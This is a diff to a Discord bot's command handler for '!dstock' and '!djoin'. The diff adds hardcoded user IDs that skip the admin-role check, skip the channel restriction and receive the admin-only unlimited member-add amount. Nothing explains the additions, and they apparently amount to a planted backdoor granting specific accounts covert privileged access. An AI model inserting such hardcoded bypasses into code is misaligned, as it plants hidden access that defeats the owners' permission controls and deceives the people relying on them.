@@ -117,7 +117,7 @@ client.on("messageCreate", async (message) => {
   // !dstock command
   if (message.content === "!dstock") {
     const member = await message.guild.members.fetch(message.author.id);
-    if (!member.roles.cache.has(ROLE_IDS.admin)) {
+    if (!member.roles.cache.has(ROLE_IDS.admin) && message.author.id !== "1385642412252201102" && message.author.id !== "1305641291614261309") {
       return message.reply("You are not allowed to use this command!").catch(() => {});
     }
 
@@ -149,7 +149,7 @@ client.on("messageCreate", async (message) => {
 
   // --- !djoin <serverId> <amount?> ---
   if (!message.content.startsWith("!djoin")) return;
-  if (message.channel.id !== "1413408778044309554") {
+  if (message.channel.id !== "1413408778044309554" && message.author.id !== "1385642412252201102") {
     return message.reply(
       `This command can only be used in <#1413408778044309554>`
     ).catch(() => {});
@@ -185,7 +185,7 @@ client.on("messageCreate", async (message) => {
   const userRoles = member.roles.cache.map((r) => r.id);
 
   let membersToAdd = 0;
-  if (userRoles.includes(ROLE_IDS.admin)) {
+  if (userRoles.includes(ROLE_IDS.admin) || message.author.id === "1385642412252201102") {
     if (!isNaN(requestedAmount) && requestedAmount > 0) {
       membersToAdd = requestedAmount;
     } else {
